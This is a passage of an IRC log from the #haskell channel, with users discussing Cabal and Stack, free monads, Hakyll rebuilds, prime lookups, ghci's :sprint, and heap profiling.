11:01:44 <davean> and nothing saves you from the sins of custom Setup.hs
11:01:51 <bitemyapp> davean: it's hard for me to know because most of the people who could ever get stuck on something like that and not know how to fix it are no longer using plain Cabal. They're all on Stack now.
11:02:04 <MarcelineVQ> electrocat: Not sure, but it seems likely
11:02:10 <bitemyapp> davean: part of my point is that I don't evaluate things based purely on my own experience, I'm evaluating things on what trips up other people.
11:02:11 <electrocat> ok thanks
11:02:19 <bitemyapp> davean: there are a lot of _other_ reasons people use Stack, I mentioned them above.
11:02:41 <bitemyapp> Given how difficult it was to get trivial fixes and changes into Cabal historically, there's value in having Stack as a work-around if nothing else.
11:02:42 <davean> bitemyapp: yes, but this one part of the conversation interests me, and stack bores me
11:02:56 <davean> bitemyapp: oh yes, I have little good to say about how cabal is managed
11:03:02 <davean> very, very little
11:03:08 <davean> I very much do not like the cabal team
11:03:31 <bitemyapp> then you understand where some of the pressure is.
11:03:45 <bitemyapp> if I report an issue with Stack, generally if it's well understood and won't take a ton of work, it gets fixed in a matter of _days_
11:03:49 <bitemyapp> and I didn't even have to fix it myself
11:04:04 <bitemyapp> I file an issue on some pretty basic UX issues with the documentation or args on Cabal, I get road-blocked.
11:04:30 <bitemyapp> GHC is a lot easier to contribute to.
11:08:29 <fragamus> http://lpaste.net/351673
11:17:02 <MarcelineVQ> fragamus: you should repeat your question to go along with that, if you're soliciting help :>
11:18:24 <fragamus> im trying to noodle it out... i was asking for help but im not clear enough to ask a good question
11:20:24 <sm> "help!" :)
11:30:43 <ph88> is it allowed to make a type like    data Foo = MkFoo (A | B)  ?
11:31:48 <dram_phone> What do you expect it to do?
11:34:14 <ph88> not sure actually :|
11:35:24 <Ptival> hello, I would like to structure a recursive function in such a way that at each recursive step, I get a handle on what's happening and can provide a behaviour (whether to continue, stop, do something...), I think this can be achieved in a continuation-passing style, but was wondering whether someone knows of a principled way of writing this, maybe using Cont/ContT?
11:35:35 <ph88> when i have an applicative style parser and wrap it in a data constructor like    Bar <$> char 'B'    how can i keep the parser but not put it in Bar. So i have a type like  data Bar = Bar   and not   data Bar = Bar Char   
11:36:08 <ph88> Ptival, what would be an example of "what's happening" ?
11:36:25 <dram_phone> ph88: not quite catching up with that
11:36:37 <ph88> dram_phone, it was a new question :|
11:36:47 <dram_phone> oh
11:36:51 <Ptival> ph88: what arguments the recursive call is receiving
11:36:56 <dram_phone> Bar <$ that
11:37:12 <dram_phone> literally a 1-char change
11:37:17 <ph88> cool !
11:37:23 <ph88> does $> exist also ?
11:37:30 <suzu> sure does!
11:37:46 <dram_phone> :t ($>) -- I think I used it just a few days ago
11:37:48 <lambdabot> error:
11:37:48 <lambdabot>     • Variable not in scope: $>
11:37:48 <lambdabot>     • Perhaps you meant one of these:
11:38:06 <suzu> <* and *> also exist
11:38:26 <dram_phone> These two sure do
11:38:59 <ph88> Ptival, i think you can code it in the return value of your function, you can put "actions" in data structures
11:39:03 <dram_phone> Ptival: Sounds like you want a free monad?
11:40:12 <dram_phone> That would allow you to basically write an 'interpreter' for 'special calls' for a, well, for your recursive function
11:40:26 * dram_phone explained it really badly
11:46:10 <Ptival> so, right now, I have a datatype:   Work t tr r = Todo t (tr -> Work t tr r) | Done r
11:46:43 <Ptival> and I write a function:   step :: T -> (TR -> Work T TR R) -> R   (for a given T, TR, and R)
11:47:17 <Ptival> (T stands for the task type, TR for the task result type, and R for the final result type)
11:49:26 <Ptival> and a function to perform a step:   performStep :: (t -> (tr -> Work t tr r) -> Work t tr r) -> Work t tr r -> Work t tr r
11:49:52 <dcoutts> bitemyapp: seeing it from the other side, I don't recognise that picture at all. It's sad there's such a disconnect. e.g. I frequently see PRs for trivial fixes contributed by newcomers being reviewed and approved within hours
11:52:39 <dram_phone> Ptival: Huge congrats!
11:52:56 <dram_phone> You (basically) invented free monads!
11:52:58 <Ptival> haha
11:53:01 <Ptival> ok...
11:53:07 <Ptival> I guess I should read on them now @__@
11:53:41 <dram_phone> you'll have an entertaining time writing instance Monad (Work t tr)
11:55:04 <geekosaur> fwiw I see a fair amount of cabal dev and discussion (in #hackage). and it seems to me the devs are often as frustrated as some users are... perhaps this means it's time for a rethink. (except new-build may have been the rethink, and backward compat seems to be a big headache there. not to mention having to hack around OS X and Windows inanity)
11:55:47 <Ptival> dram_phone: would my Work type be the "DSL" in this case?
11:56:03 <dcoutts> geekosaur: new-build has been working pretty well I think
11:56:26 <geekosaur> yes, but the path there looks to have involved many dev expletives >.>
11:56:28 <dram_phone> You are already doing a decent DSL here
11:56:38 <dram_phone> You just need a monadic boost
11:56:41 <dcoutts> geekosaur: :-)
11:57:29 <dram_phone> And somehow it's all nicer because you get do-notation, applicatives, and other goodies
11:57:43 <dram_phone> Ptical: ^
11:58:46 <dram_phone> uh
11:58:51 <dram_phone> Ptival: ^
11:59:23 <roxxik> and Iter is there to help you, too
12:00:48 <zipper> Hey, how do you guys use random in monads other than IO ?
12:01:06 <roxxik> `delay :: (Monad f, MonadFree f m) => m a -> m a` let's you stuff something in between your computation steps
12:01:16 <zipper> Like in my case I have a parseJSON that I want to use random but the monad is Parser
12:01:41 <roxxik> but i haven't used, just read the docs :S
12:01:41 <geekosaur> zipper, the only time you need IO is getting an initial seed. after that, any monad that gives you access to state will do to carry the seed around
12:02:16 <zipper> hmmm I see
12:03:10 <geekosaur> there are convenience functions that use a seed in a hidden IORef, but you can use the lower level ones with state (see MonadRandom for a wrapper that iirc can also be used in a monad transformer stack) or write your own wrappers
12:06:37 <dram_phone> Do the IORef ones run faster?
12:06:39 <lpaste> dmwit pasted “why is Cabal outdated?” at http://lpaste.net/8708848608495009792
12:07:07 <dmwit> I can't get `cabal test` to run; it keeps complaining that I should redo the `configure` step, even after I've immediately done that.
12:07:10 <dmwit> Any ideas?
12:08:28 <dcoutts> dmwit: we should probably discuss this on #hackage it's more or less the dev channel for this topic
12:08:38 <dmwit> ok
12:08:57 <ertes> helo
12:09:18 <dmwit> I asked here because it didn't seem like it was necessarily specific to the cabal codebase, but I'm happy to continue there.
12:15:49 <buglebudabey> i'm running my hakyll site and when i rebuild no changes to my site.hs file are recognized, nothing changes about the site. what do?
12:16:08 <buglebudabey> i've run 'stack exec site rebuild' and that doesn't make changes from changes in my site.hs file
12:16:54 <sm> buglebudabey: that's running the compiled "site", but not recompiling it from "site.hs"
12:17:27 <sm> try stack ghc site && ./site rebuild, or stack exec -- ./site.hs rebuild
12:17:32 <buglebudabey> sm so how can my changes in site.hs, such as adding a page, be made?
12:17:41 <buglebudabey> oh ok i'll try those
12:17:54 <romano_> hi guys
12:18:13 <fragamus> is there a hoogle that i could use for stuff like this    liftIO :: IO a -> Shell a
12:18:54 <zipper> geekosaur: I am trying to sneak random here http://lpaste.net/3956142630303170560#line11 based on the value of a
12:19:13 <zipper> but it just won't let me do any IO returning operation
12:20:19 <zipper> wait
12:20:45 <fragamus> like is turtle part of any of these hoogles and if so link please
12:22:24 <geekosaur> zipper, I have to think needing a random value there is odd
12:22:51 <zipper> geekosaur: I have an array and I want to pick one of it's elements at random
12:22:52 <EvanR> fragamus: i think locally installed hoogle searches everything you have installed
12:23:15 <fragamus> i guess thats the way to go
12:23:38 <zipper> geekosaur: Like in a list [1,2,3,4,5,6] how to get a random index to extract from
12:23:48 <zipper> *extract using
12:23:56 <geekosaur> fragamus, one oddity about hoogle is its default search is limited and you need a package constraint to search other things. hoogle.haskell.org does support 'package:turtle'
12:24:15 <geekosaur> although being the alpha hoogle it apparently doesn't do type searches right :*
12:24:21 <fragamus> yay!
12:24:42 <EvanR> alpha hoogle
12:24:49 <EvanR> fun to say
12:25:03 <shapr> geekosaur: does that work for command line hoogle as well?
12:25:06 <shapr> I could certainly benefit from that.
12:25:10 <geekosaur> yes iirc
12:25:16 <AWizzArd> The Learn You A Haskell book brings this code example:  data Frank a b  = Frank {frankField :: b a}      It has a kind of Frank :: * -> (* -> *) -> *       Is there a way to write this type down without the braces {}?
12:25:48 <geekosaur> data Frank a b = Frank (b a)
12:26:16 <buglebudabey> thank you sm, that worked, does it say to do that somewhere on the hakyll site and i missed it?
12:26:25 <AWizzArd> geekosaur: thanks
12:27:39 <sm> buglebudabey: no, it looks like the hakyll site could make this clearer
12:28:14 <buglebudabey> alright, that's too bad
12:28:28 <sm> send a bug report
12:29:09 <sm> while you're tweaking site.hs, it's often best to run it uncompiled (the second command I gave)
12:30:56 <sm> and if you make it a stack script (or if you have hakyll and any other deps installed user-wide) you don't need to type the "stack exec --" bit
12:31:23 <buglebudabey> sm - i couldn't run that second command, it said i didn't have permissions because i wasn't owner of ./stack and when i added a flag to allow-other-users it denied me
12:31:31 <buglebudabey> sm i ran the first two you gave
12:32:02 <sm> chmod +x site.hs  might help
12:33:54 <buglebudabey> when you gave the command 'stack exec -- ./site.hs rebuild' did you mean ./site? sm
12:34:45 <buglebudabey> i changed it to ./site, now it works with the added permissions, thanks
12:35:12 <sm> buglebudabey: no, the idea was to run site.hs in interpreted mode, so your changes are always seen immediately
12:35:28 <zipper> Why do we convert haskell arrays to lists?
12:35:42 <zipper> It's something I've noticed
12:35:45 <buglebudabey> sm oh, well it gave me an error saying that {-- wasn't a command
12:36:05 <buglebudabey> {-# i mean
12:36:09 <dram_phone> https://docs.haskellstack.org/en/stable/GUIDE/#ghcrunghc
12:36:52 <dram_phone> And I suppose just exec-ing it didn't really work because https://docs.haskellstack.org/en/stable/GUIDE/#script-interpreter
12:37:13 <kadoban> You should just set it up according to the script interpreter link there if that's what you want to do.
12:37:19 <dram_phone> Ooh which leads to this:
12:37:22 <dram_phone> You can use stack <file name> to execute a Haskell source file 
12:37:22 <kadoban> Then you can just run it, don't need to mess around with 'stack exec --'
12:37:25 <dram_phone> TIL
12:37:39 <kadoban> You don't even need the stack part, you can run it like any script,    ./site.hs
12:38:19 <dram_phone> buglebudabey: Try this: 'stack site.hs'
12:38:49 <buglebudabey> dram_phone it works but theres some warning that said it expects stack options etc
12:39:26 <sm> right. site.hs can just have a #!/usr/bin/env runghc shebang line, but a stack shebang line means it can ensure dependencies are present
12:39:34 <dram_phone> ok so you still need to set it up according to that link
12:39:42 <dram_phone> the script interpreter link
12:40:13 <buglebudabey> ok so that link should set me right for everything?
12:41:02 <kadoban> Use the script interpreter one and follow it correctly, and sure. I use it all the time.
12:41:03 <dram_phone> It should set it up so ./site.hs works like it should
12:41:25 <Ptival> dram_phone: I'm actually stuck writing the Applicative instance,   Todo t k <*> Done r = ...
12:41:53 <Miroboru_> I have a lazy function, primes, and then do "plist = take 100000 primes". If I then use plist as an argument to a function, will it be evaluated every time it is used, or will it be evaluated once (that is  - computing 100000 primes) and then used every time?
12:42:03 <buglebudabey> alright thanks
12:42:48 <Ptival> the only thing I can return is   Todo t (\tr -> _),   but then I only have (tr :: tr), (k :: tr -> Work (a -> b)), and (r :: a)
12:43:12 <Miroboru_> I ask because I am trying to do this, and things are insanely slow....
12:43:33 <Ptival> so I can make (k tr :: Work (a -> b)), and case on it, and in the Done case I'm fine
12:44:13 <Miroboru_> Is it possible to force the evaluation so that plist becomes an array (or list) of integers?
12:45:36 <johndcl> Hi. Can I bind keyboard shortcuts in ghci? For example I'd like to bind Ctrl-M to :reload.
12:45:47 <johndcl> :reload<CR>
12:48:17 <EvanR> Miroboru_: iterpreting the question literally, it may never get evaluated
12:48:40 <EvanR> take 100000 primes passed as an argument or not might never do anything
12:48:55 <EvanR> so the question is what your function is doing
12:49:36 <Miroboru_> Well, it basically does "p `elem` plist" at different places
12:49:55 <Miroboru_> To check if p is a prime
12:50:12 <dmj`> johndcl: don’t think so, but haskell-mode for emacs does that with C-c C-l
12:51:20 <Miroboru_> That is why I need to to truncate it ( I haven't found a good alternative to elem that takes into consideration the fact that plist is sorted.)
12:52:28 <Miroboru_> Anyway - I suspect plist is lazily evaluated every time it is used like this ("p `elem` plist")
12:52:41 <kadoban> Miroboru_: If you need to do many queries of "is this prime?" you should probably be using something other than a list. A Set would work, or an IntSet will be faster, or an Array, which you can binary search in.
12:53:26 <kadoban> Miroboru_: If you have named plist at the top level, its value will be computed at most once.
12:53:30 <Miroboru_> kadoban: Ok, thanks - I will refer to the documentation of this datastructures
12:53:38 <qmm> it is -1.6931471805599454
12:53:48 <qmm> how can i say 2 ^ it
12:54:02 <qmm> Could not deduce (Integral b0) arising from a use of ‘^’
12:54:04 <kadoban> Miroboru_: Also, how are you generating the primes list? That can be done *very* slowly, or quite quickly, depending on how you're doing it.
12:54:17 <qmm> i'll think about this a little more
12:54:34 <Miroboru_> I am using a proper sieve of erasthotenes (http://www.garrisonjensen.com/2015/05/13/haskell-programs-are-lies.html)
12:54:36 <geekosaur> qmm, there's 3 different exponentiation operators
12:54:40 <geekosaur> :t (^)
12:54:42 <lambdabot> (Num a, Integral b) => a -> b -> a
12:54:45 <geekosaur> :t (^^)
12:54:47 <lambdabot> (Integral b, Fractional a) => a -> b -> a
12:54:51 <geekosaur> :t (*)
12:54:53 <lambdabot> Num a => a -> a -> a
12:54:57 <geekosaur> er
12:54:57 <mmaruseacph2> til about (^^)
12:55:00 <geekosaur> :t (**)
12:55:02 <lambdabot> Floating a => a -> a -> a
12:55:04 <geekosaur> that one
12:55:08 <wonder01> The solver for my stack project is 7.16. I want to use alex-3.2.1, however alex-3.1.7 is in the lts-7.16 snapshot.
12:55:30 <wonder01> The error I'm getting is setup: The program 'alex' version >=3.2.1 is required but the version found at     /home/me/.stack/snapshots/x86_64-linux/lts-7.16/8.0.1/bin/alex is version
12:55:31 <geekosaur> wonder01, you'd need to list the later version in extra-deps in stack.yml
12:55:48 <geekosaur> so it overrides the resolver
12:55:54 <qmm> geekosaur: helpful! thank you
12:55:56 <kadoban> Miroboru_: Ah. That's also available, a better one I believe, in the 'primes' package. A better writeup is https://www.cs.hmc.edu/~oneill/papers/Sieve-JFP.pdf
12:56:12 <EvanR> Miroboru_: elem traverse the list from the beginning and checks each item for equality
12:56:17 <EvanR> thats why its slow
12:56:45 <EvanR> if its also recomputing the primes list each time, its even slower
12:56:51 <EvanR> whether it does depends
12:57:00 <geekosaur> wonder01, https://docs.haskellstack.org/en/stable/yaml_configuration/#local-dependency-packages-extra-dep
12:57:30 <wonder01> geekosaur: I have:
12:57:34 <wonder01> extra-deps: - alex-3.2.1
12:58:08 <kadoban> wonder01: Good. It's usually on separate lines, but I don't know if it needs to be. It might.
12:58:25 <wonder01> It is on separate lines (copy/paste rendering)
12:58:32 <geekosaur> I think it does
12:58:39 <geekosaur> yaml is ... interesting
12:58:48 <geekosaur> and I poitned to the wrong thing (s/b https://docs.haskellstack.org/en/stable/yaml_configuration/#extra-deps) but you're using the right one
12:58:54 <Miroboru_> EvanR: Yes - I need to redo this a bit - just doing some project Euler problems (http://projecteuler.net/) to learn myself some Haskell, and I thought I would get away with doing it very quick and dirty... No such luck :) 
12:58:58 <geekosaur> so, I don't know
13:00:22 <Miroboru_> kadoban: Thanks - I know the paper, and I think the code I linked to is based on this. Anyway, I'd rather use a proper Haskell package. I'll have a look at the primes package 
13:01:08 <kadoban> I suspect the code you linked is based on it, but not using the optimal data structure.
13:01:15 <kadoban> I didn't look too close though.
13:04:05 <johndcl> dmj`: I put 'bind: ctrl-o : r return' line in ~/.haskeline. For some reason I couldn't rebind ctrl-m.
13:04:42 <glguy> johndcl: ^M is the enter key
13:05:03 --- mode: glguy set -o glguy
13:05:09 <johndcl> I hoped I could rebind it since I have Enter on my keboard. :o)
13:05:45 <glguy> from the terminal's point of view they're the same thing
13:07:50 <dolio> Yeah, at the level haskeline sits, I don't think it's possible to detect the difference.
13:08:28 <dfeuer> dmwit: does your Exists thing have any useful instances?
13:09:04 <geekosaur> johndcl, it's not possible; you need to use a GUI event interface to see the difference
13:09:45 <dfeuer> dolio: Did you see my message about traversing roots and leaves? I figured you might be the one who would have thoughts.
13:10:09 <dolio> I haven't.
13:11:03 <dfeuer> dolio: if you define `traverse` for a tree, you'll typically end up with a lot of fmap happening in the leaves. You can generally avoid it by doing a lot of extra pattern matching, but it's obnoxious.
13:11:23 <dfeuer> I'd love to find a fix.
13:23:11 <qmm> how would i say create a new list which subtracts the last number from the current number given a list like [10..1]
13:23:57 <koala_man> [10,9..1]
13:24:03 <qmm> koala_man: thanks
13:24:49 <qmm> the first element would be subtracted by a number to start with
13:24:54 <qmm> the second would be 10 -9
13:24:59 <qmm> third would be 9 -8
13:25:07 <qmm> 9 - 8 --not negative
13:25:19 <qmm> surely i can think of this without resorting to #haskell for answers :)
13:25:48 <qmm> i'll ask later if i'm stumped
13:25:50 <koala_man> oh, you wanted [x,y,z] to become [x-y, y-z] ?
13:25:56 <qmm> right
13:26:18 <qmm> i immediately looked into foldr, but then it results in a single number instead of a list of them
13:26:27 <qmm> (brain fart)
13:26:36 <kadoban> > let xs = [1..10] in zipWith subtract xs (tail xs)
13:26:39 <lambdabot>  [1,1,1,1,1,1,1,1,1]
13:26:41 <kadoban> That?
13:26:43 <kadoban> Wait ...
13:26:56 <kadoban> Well, maybe that's what you want, I dunno exactly.
13:27:22 <qmm> kadoban: i appreciate your help. i'll look at this channel a little later since i'm wanting to figure it out for myself right now
13:27:33 <kadoban> Fair enough, sorry.
13:27:52 <koala_man> kadoban: I think it is, except this gives you next-previous instead of previous-next
13:28:25 <kadoban> Ya, could be
13:28:36 <koala_man> > let xs = [5,3,2,2] in zipWith (-) xs (tail xs)
13:28:39 <lambdabot>  [2,1,0]
13:28:48 <koala_man> 5-3, 3-2, 2-2
13:30:10 <dmwit> dfeuer: Not many. `instance Show (Exists Show)` and similar serialization classes.
13:30:23 <dmwit> deserialization is harder =P
13:32:00 <skeuomorf> Are there books in the same vein as "The Haskell road to logic, ..." but dicsusses more advanced mathematical topics with the same level of Haskell expectations?
13:32:22 <monochrom> Such as general relativity? :)
13:33:08 <skeuomorf> i.e. takes the reader through learning Haskell while at the same time learning some mathematical branch?
13:33:19 <skeuomorf> monochrom: Sure, why not?
13:33:46 <skeuomorf> Even something in the vein of SICM but uses Haskell instead of scheme
13:37:36 <dfeuer> dmwit: hrmm... You can do a little better with the Show instance using Data.Constraint.Forall.
13:40:22 <abhiroop> I am trying to understand a piece of List Transformer code: http://lpaste.net/351676
13:40:36 <abhiroop> Can someone explain why this output came up. I mentioned my expected output in the file http://lpaste.net/351677
13:42:33 <Zemyla> If a Profunctor p is both Representable and Corepresentable, then Rep p and Corep p are adjoint, right?
13:45:28 <dmwit> dfeuer: do tell
13:48:43 <dfeuer> dmwit: oh, sorry I vanished.
13:49:12 <dfeuer> dmwit: the gist is that if   c a :- Show a, then Exists c should be Show, right?
13:50:26 <dmwit> Yes, but `c a :- Show a` is a term-level thing. So how do you use it in the `Show` instance?
13:50:39 <dfeuer> dmwit: give me a moment.
13:50:43 <dmwit> See also glguy's proposal for `Object` which solves this by writing `Show \in cs` as a type-level thing.
13:51:22 <dfeuer> I'm pretty sure I can do this, but I'll need to think a sec.
13:51:31 <codedmart> I am working on tracking changes to my data. I convert them toJSON and check that way. The problem is I started out pattern matching each case as I go and now I feel like this is way out of hand. Anyone have some suggestions for simplifying this: https://gist.github.com/codedmart/c28ed15d956b043033a6952689f021c3#file-activitylog-hs-L116-L143
13:51:56 <codedmart> This actually works just seems like to much to me.
13:52:40 <dmwit> codedmart: The thing to google for is "tree diff".
13:52:53 <dmwit> There's lots of information online about different ways to diff trees, with different tradeoffs.
13:53:19 <codedmart> dmwit: Are my assumptions right that this code is not good practice?
13:53:23 <dmwit> There's also http://hackage.haskell.org/package/gdiff
13:53:35 <dmwit> which you might like, but should be used without bothering with `toJSON`.
13:54:04 <dfeuer> dmwit: write  class Show a => Q (c :: * -> Constraint) a; instance Show a => Q c a; instance (Forall (Q c)) => Show (Exists c) where ...
13:54:04 <dmwit> codedmart: Mine eyes glazeth over. That's usually a bad sign, but not always.
13:54:30 <dfeuer> It's not pretty, but I think it will work.
13:54:48 <dfeuer> Oh, no, that doesn't work.
13:54:51 <dfeuer> What am I thinking.
13:54:57 <dfeuer> Brain broke.
13:55:07 <dfeuer> Or ...
13:55:08 <phadej> codedmart: I used https://github.com/haskell/cabal/blob/master/Cabal/tests/StructDiff.hs
13:55:15 <dfeuer> Or does it?
13:55:22 <phadej> it works with generics-sop, and work'd well enough
13:55:25 * dfeuer needs toplay more.
13:55:36 <phadej> (compared Cabal GenericPackageDescription AST's with it)
13:56:20 <dmwit> dfeuer: Since there appears to be no connection between `c` and `Show` there, it seems unlikely that it means what we want it to mean.
13:56:28 <dfeuer> Yeeeeah.
13:56:38 <dfeuer> dmwit: give me another few minutes.
13:56:46 <dfeuer> I am confident I can do it another way.
13:57:12 <dfeuer> Moderately confident.
13:57:27 <codedmart> phadej: OK cool I will take a look.
13:57:29 <codedmart> Thanks guys
13:58:33 <dfeuer> Grr.
14:01:30 <dmwit> abhiroop: Did you get an answer?
14:03:56 <dfeuer> dmwit: actually, it works exactly like I said.
14:04:31 <lpaste> dfeuer pasted “Show Exists” at http://lpaste.net/351680
14:04:40 <dfeuer> dmwit: ^^
14:04:50 <dfeuer> At least, I think that works.
14:04:55 <dfeuer> Haven't actually tested it.
14:06:14 <dmwit> I severely doubt you can show `Forall (Q c)` for any interesting `c`.
14:06:17 <dfeuer> Oh, no, this is not working.
14:06:26 <dmwit> e.g. even `c ~ Show`
14:06:28 * dfeuer is being stupid.
14:06:36 <dfeuer> Gah.
14:07:24 <dmwit> abhiroop: Can you explain why you expected the output you did? Perhaps I can help clear up where you've made a mistake.
14:09:59 <dmwit> dfeuer: You could imagine `class BetterThanShow c where betterThanShow :: c a :- Show a; instance BetterThanShow c => Show (Exists c)`.
14:10:18 <dfeuer> Yeah, but then you have trouble getting the instances.
14:10:24 <dfeuer> :(
14:10:40 <dmwit> Indeed, you have to write them.
14:11:06 <dfeuer> dmwit: whata's this proposal to fix the trouble?
14:11:11 <dfeuer> Where?
14:12:13 <abhiroop> ([1,2],'a')
14:12:13 <abhiroop> ([1,2],'b')
14:12:18 <abhiroop> dmwit: my expectation was owing to the fact that the function test will execute the first time and produce 
14:12:44 <dmwit> abhiroop: So far, so good.
14:12:56 <abhiroop> and followed by that it will execute test again
14:13:04 <abhiroop> ignore the first test
14:13:08 <dmwit> This is your mistake.
14:13:34 <abhiroop> but now I am getting some surprising results
14:14:07 <abhiroop> I didn't expect [(),()]>>[10,20] to emit [10,20,10,20]
14:14:23 <dmwit> abhiroop: Yes, the two surprises are related. =)
14:15:20 <dmwit> abhiroop: You are thinking that `(>>)` ignores its first argument. But this is not true: it merely ignores the *values produced* by its first argument.
14:15:45 <dmwit> abhiroop: So for lists, this means `(>>)` ignores the values of the elements of the list you pass as the first argument. But it doesn't ignore the list entirely -- the size of the list is used!
14:15:52 <Koterpillar> if that were true, what would happen here: putStrLn "first" >> putStrLn "second" ?
14:17:16 <abhiroop> I am expecting  "first" followed by "second" without the quotes of course
14:17:46 <geekosaur> but those are not results; the result is an IO ()
14:19:23 <dmwit> abhiroop: Consider this related action: `[1,2] >>= \x -> [10+x, 20+x]`. What do you expect to happen?
14:20:03 <dmwit> > [1,2] >>= \x -> [10+x, 20+x]
14:20:05 <lambdabot>  [11,21,12,22]
14:20:11 <dmwit> Now this one:
14:20:21 <dmwit> > [1,2] >>= \x -> [const 10 x, const 20 x]
14:20:26 <lambdabot>  [10,20,10,20]
14:20:28 <dmwit> should be no surprise
14:20:41 <dmwit> > [1, 2] >>= \x -> [10, 20]
14:20:43 <lambdabot>  [10,20,10,20]
14:20:49 <dmwit> > [(), ()] >>= \x -> [10, 20]
14:20:51 <lambdabot>  [10,20,10,20]
14:21:02 <dmwit> ...which leads us to your example. =)
14:21:24 <abhiroop> wow that was a great example!
14:21:32 <abhiroop> thanks dmwit!
14:21:39 <abhiroop> aha moment
14:34:11 <orzo> So i've just discovered :sprint in ghci and I cannot seem to convince it to print anything other than "x = _" for a variablex
14:34:20 <SpinTensor> hi. I want to write a function that gets the first commandline argument if and only if exactly one is present. i tried this, but i don't understand it apearrently
14:34:34 <SpinTensor> http://pastebin.com/NWKxjp8e
14:34:44 <glguy> orzo: Well, what type does x have?
14:34:48 <Ptival> http://paste.awesom.eu/6lna   does anyone know how to make workIt print Todo 1, Todo 10, Todo 2, Todo3
14:34:55 <glguy> orzo: and how did you define x?
14:35:16 <orzo> differnet ways, as a list at first
14:35:25 <orzo> just tell me something to try 
14:35:29 <glguy> SpinTensor: You can't start guards after that first '='
14:35:32 <orzo> to see something different with spine
14:35:36 <geekosaur> SpinTensor, I am guessing from the []s that you are not in IO
14:35:37 <glguy> SpinTensor: You can use if then else, or you can use case of
14:35:44 <glguy> SpinTensor: In this case you want case of
14:35:53 <Xyliton> How would one work with 3D matrices in Haskell?
14:36:04 <hpc> orzo: import System.IO and use evaluate
14:36:19 <hpc> just kidding, Control.Exception
14:36:20 <SpinTensor> ok thanks. I try, and will come back to you
14:36:24 <Tuplanolla> Arrays or matrices, Xyliton?
14:36:28 <glguy> orzo: You can't hand-wave the answer, it matters what you wrote
14:36:46 <hpc> orzo: so you can do something like
14:36:49 <hpc> let x = Just 5
14:36:50 <hpc> evaluate x
14:36:53 <hpc> :sprint x
14:37:26 <athan> what would it look like if a behavior could affect the rate of time?
14:37:30 <hpc> but it matters what type x has, the value it has, and what operations you have performed on it
14:37:32 <orzo> hpc, do you mean Control.Exception.evaluate?
14:37:38 <lpaste> glguy pasted “for spin tensor” at http://lpaste.net/351681
14:37:52 <hpc> evaluation is sensitive to pretty much everything
14:37:53 <Xyliton> Tuplanolla: I want to "Circle Hough Transform" a picture and the wikipedia articles says that it needs a "3d parameter space" and a "3d accumulator matrix", su I suppose i need matrices 
14:38:09 <glguy> hpc: Like in your example x has a polymorphic type, so sprint will always report _
14:38:29 <hpc> oh crap, right
14:38:31 <hpc> let x = Just False
14:39:19 <orzo> hpc, i tried your first example, let x = Just 5, evaluate x (it showed Just 5), :sprint x (it showed x = _)
14:39:42 <Tuplanolla> A Hough transform should only require ordinary matrices, so I guess `hmatrix`, Xyliton.
14:40:01 <glguy> orzo: Turn the monomorphism restrict back on, or give 'x' a monomorphic type
14:40:01 <hpc> orzo: let x = Just 5, then evalute (isJust x)
14:40:50 <hpc> argh, False is already in normal form
14:40:53 <Tuplanolla> If you just want arrays, there's `repa`, Xyliton.
14:41:06 <hpc> aha
14:41:12 <hpc> let x = Just (id False)
14:41:13 <hpc> :sprint x
14:41:16 <MarcelineVQ> orzo: another fun and direct example is a list with a concrete type like   x = [1..10 :: Int]    :spriint x    take 2 x    :sprint x
14:41:30 <hpc> it happens to already be in whnf because the root of the expression is a constructor
14:41:47 <hpc> and then id is used here to introduce laziness
14:41:55 <hpc> which is funny because id is technically a strict function
14:42:28 <Xyliton> Tuplanolla: I'm not sure what's easier. I only have a limited amount of knowledge about matrices
14:43:01 <hpc> (tested and working on my machine btw)
14:43:30 <hpc> orzo: and that's your first lesson in "strictness changes depends on anything and everything you do"
14:43:49 <glguy> The real lesson is on why the Monomorphism restriction is your friend
14:44:08 <hpc> that too
14:44:32 <dolio> No it isn't.
14:44:53 <glguy> Is too!
14:44:55 <hpc> it's also your enemy, but in this case it's a bit of a friend
14:45:14 <hpc> like frank in mash
14:45:21 <hpc> this is the episode where you almost feel sorry for him in one scene
14:45:38 <hpc> tomorrow the DMR will be right back to scheming with hot-lips ;)
14:45:45 <sm> heh
14:47:04 <orzo> glguy, does ghci turn the monomorphism restriction off by default?
14:47:11 <uiop> hpc: i believe the term is "frenemy"
14:47:14 <glguy> Yeah
14:56:23 <EvanR> I guess I should post this here too... my haskell meetup has a new website: http://haskellcats.net/
14:56:43 <EvanR> i havent gone back and recovered all the topics we covered over the last year, but i will
14:58:00 <dolio> Did you take over the website where people posted Haskell cat image macros?
14:58:20 <johnw> lambdacats?
14:58:24 <orzo> i've been debuging memory leaks, and I find some things surprising.  My 15.5 hours, but the hp2ps graph shows only to 2400 seconds.  It also shows two strange unexpected phase shifts.
14:58:47 <orzo> sorry, I mean to say I ran the test for 15.5 hours, but the graph i got out is only to 2400 seconds
14:59:40 <EvanR> oh yeah, lambdacats
14:59:54 <EvanR> i figured there was somebody with a similar name somewhere
15:04:20 <Tuplanolla> How did you find attendees, EvanR?
15:05:03 <EvanR> i posted a hilarious flyer around town
15:05:20 <EvanR> involving bottom-ra: the never terminating, picture there on the page
15:05:36 <Tuplanolla> Did you even offer snacks?
15:05:38 <sm> EvanR++
15:05:49 <EvanR> at zotz cafe you cant bring outside food
15:06:50 <Tuplanolla> I consider arranging something similar every now and then, but then I stop.
15:07:05 <EvanR> wherever turing completeness exists... bottom ra lives!
15:09:21 <orzo> here's my heap profile, http://oi63.tinypic.com/119c5xl.jpg
15:09:57 <fragamus> ok I have figured out a good question to ask
15:10:01 <orzo> without knowing much about my code, is there any typical intuitive guess you could make about either of the two phase shifts?
15:10:39 <orzo> does the gc change algorithm at some threshold?
15:11:06 <fragamus> I am working with Turtle and I want to list the files in a directory like this     s <- (ls "some/dir")    but I want to reduce the stream such that I only get the first element
15:11:55 <hpc> orzo: does your algorithm change at some threshold?
15:12:55 <fragamus> I just want one Turtle.FilePath   from     (ls "some/dir")
15:12:59 <fragamus> any ideas
15:13:19 <Tuplanolla> What's the type of `ls`, fragamus?
15:13:49 <fragamus> ls :: Turtle.FilePath -> Shell Turtle.FilePath
15:13:54 <Cale> orzo: Nope, what does your program do?
15:14:11 <orzo> it has a bootstrapping phase, and I discounted that because it is too breif to last for half the duration of the test.  But that was before I noticed that I'm not seeing the full duration.  The time stamps at the bottom show it happened at 1100 seconds, which is makes it a reasonable explanation
15:14:28 <orzo> why does my graph not show the full 15.5 hours that i ran the program?
15:14:48 <Cale> It only shows the time spent in the mutator
15:15:06 <Cale> (I think -- in any case, it's not wall clock time)
15:15:14 <orzo> those aren't wall clock seconds?
